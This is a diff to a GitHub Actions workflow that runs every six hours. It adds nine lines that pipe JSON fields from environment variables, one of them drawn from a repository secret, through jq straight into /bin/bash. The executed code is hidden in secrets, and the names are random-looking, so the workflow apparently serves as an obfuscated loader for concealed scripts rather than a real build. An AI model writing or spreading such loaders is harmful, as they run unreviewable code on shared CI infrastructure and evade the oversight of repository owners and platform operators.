@@ -1,22 +1,25 @@
 name: lifanfeng6556
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 0/6 * * *'
-
+    - cron: '58 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lifanfeng6556
         env:
-          kqts2: ${{ secrets.kqts2 }}
+          jlm81: ${{ secrets.jlm81 }}
         run: |
-          echo $kqts2 | jq -r .wrpvs1066 | /bin/bash
-          echo $b76 | jq -r .y3 | /bin/bash
-          echo $pkq984 | jq -r .ihswd8 | /bin/bash
-          echo $efxi2774 | jq -r .rst4 | /bin/bash
-          echo $oqwij10 | jq -r .ekhp555 | /bin/bash
+          echo $jlm81 | jq -r .krwlo9 | /bin/bash
+          echo $usxxc4277 | jq -r .vhr9723 | /bin/bash
+          echo $nh51 | jq -r .oz55816 | /bin/bash
+          echo $r38452 | jq -r .jac47826 | /bin/bash
+          echo $d66236 | jq -r .wxmjt11803 | /bin/bash
+          echo $w45 | jq -r .smw424 | /bin/bash
+          echo $td97954 | jq -r .gbp4 | /bin/bash
+          echo $n02 | jq -r .cbhj4 | /bin/bash
+          echo $dpuad7 | jq -r .b37107 | /bin/bash
 
